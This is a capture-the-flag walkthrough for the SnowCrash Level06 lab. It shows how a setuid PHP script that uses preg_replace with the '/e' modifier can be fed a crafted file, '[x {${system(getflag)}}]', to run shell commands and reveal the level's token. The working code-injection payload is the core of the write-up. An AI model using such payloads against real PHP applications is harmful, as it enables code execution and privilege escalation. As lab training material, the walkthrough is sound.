# Level06

## Hint

Use a [PHP beautifier](https://codebeautify.org/php-beautifier) to format the code and a [regex explainer](https://regex101.com/) to understand the regex.

## Answer

Let's check our current directory:
```
level06@SnowCrash:~$ ll
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout*
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc*
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
-r-x------  1 level06 level06  675 Apr  3  2012 .profile*
```

Alright we have a PHP code file and it's executable. Let's look at the PHP code first:
```php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

I will use a [PHP beautifier](https://codebeautify.org/php-beautifier) to format the code and make it more readable:
```php
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;

?>
```

Perfect ! We notice that the PHP code requires two parameters, it will try to open the first one so we need to give it a valid path to a file. After more analysis and the use of a [regex explainer](https://regex101.com/), we realize that the second parameter is useless and so is most of the code and only this line will be exploitable:
```php
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

From [this article](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace) I learned that the `e` modifier can be used to execute code. First let's match the regex:
```
level06@SnowCrash:~$ echo [x hey] > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
hey
```

Great ! We can also use the `${}` PHP syntax to turn our string into a variable:
```
level06@SnowCrash:~$ echo '[x ${hey}]' > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
PHP Notice:  Undefined variable: hey in /home/user/level06/level06.php(4) : regexp code on line 1
```

Perfect ! Now all we have to do is execute the `system` or `exec` PHP functions to execute shell commands:
```
level06@SnowCrash:~$ echo '[x {${system(getflag)}}]' > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
